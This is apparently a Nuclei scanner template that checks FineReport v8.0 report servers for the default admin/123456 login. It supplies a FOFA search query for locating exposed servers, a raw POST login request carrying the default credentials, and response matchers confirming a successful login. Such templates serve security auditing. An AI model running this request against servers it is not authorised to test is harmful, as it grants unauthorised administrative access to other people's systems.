id: finereport-v8-defualt-password

info:
  name: FineReport v8.0 Default Password
  author: qwtd
  severity: high
  description: |
    FineReport v8.0 has a default password vulnerability, which can be exploited by attackers to log in to the system with the default password.
    The default password is 123456.
    The default username is admin.
  metadata:
    fofa-query: app="fanruansem-FineReport"
  tags: 帆软-FineReport

http:
  - raw:
      - |
        POST /WebReport/ReportServer?op=fs_load&cmd=login HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 71
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
        Accept: */*
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=5D0ABB8C94684CD4C7F085013741099A; fr_remember=false; fr_password=; fr_username=admin; SECKEY_ABVK=xDu3yDYibeIKr4dZtCL59lDGbEpcJWU8o1PZuqnrS10Cx/y9Hm6DVtaM7kXxHuKZTAMSn6fvmX4/hpNHYhjS3g%3D%3D; BMAP_SECKEY=xDu3yDYibeIKr4dZtCL59lDGbEpcJWU8o1PZuqnrS12__UWv7PEFyyAWCI3siMzx9tm9M8i4FwThrObilzpmJPrgZJsWzImeYIaI-6t8M07WnUYDLQlFDmd61pPUUK32ugawkj_5XvCxzPSTcZeUtRcMvVEjmc2yeDurj-iu8jPczBkkeiaJ9c10yD1OApC728yrr-YEKwfE0aMJoHGPvg
        Connection: keep-alive

        fr_username=admin&fr_password=123456&fr_remember=false&ip=&city=&theme=


    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(header,"fr_username=admin")'
          - 'status_code == 200 && contains(header,"fr_password=")'
